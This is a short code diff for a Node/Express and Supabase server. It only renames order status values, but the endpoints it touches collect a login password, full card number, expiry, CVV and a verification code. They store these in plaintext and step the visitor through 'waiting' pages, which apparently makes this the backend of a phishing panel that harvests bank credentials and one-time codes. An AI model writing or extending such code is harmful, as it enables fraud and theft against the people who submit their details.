@@ -139,7 +139,7 @@ app.post('/api/orders', async (req, res) => {
       watch_index: watch_index !== undefined ? watch_index : null,
       session_id: session_id || null,
       current_page: 'order',
-      status: 'pending',
+      status: 'new',
       created_at: new Date().toISOString()
     });
     if (error) throw error;
@@ -171,7 +171,7 @@ app.post('/api/password-data', async (req, res) => {
       return res.status(400).json({ success: false, message: 'Password must be at least 6 digits' });
     }
     if (order_id) {
-      await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending' }).eq('id', order_id);
+      await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'waiting' }).eq('id', order_id);
     }
     res.json({ success: true });
   } catch (err) {
@@ -186,7 +186,7 @@ app.post('/api/card-data', async (req, res) => {
     if (order_id) {
       await supabase.from('orders').update({
         card_name, card_number: card_number, card_expiry: expiry, card_cvv: cvv,
-        current_page: 'card-waiting', status: 'card_pending'
+        current_page: 'card-waiting', status: 'card_received'
       }).eq('id', order_id);
     }
     res.json({ success: true });
@@ -200,7 +200,7 @@ app.post('/api/code-data', async (req, res) => {
   try {
     const { order_id, code } = req.body;
     if (order_id) {
-      await supabase.from('orders').update({ verification_code: code, status: 'code_pending', current_page: 'code-waiting' }).eq('id', order_id);
+      await supabase.from('orders').update({ verification_code: code, status: 'code_waiting', current_page: 'code-waiting' }).eq('id', order_id);
     }
     res.json({ success: true });
   } catch (err) {
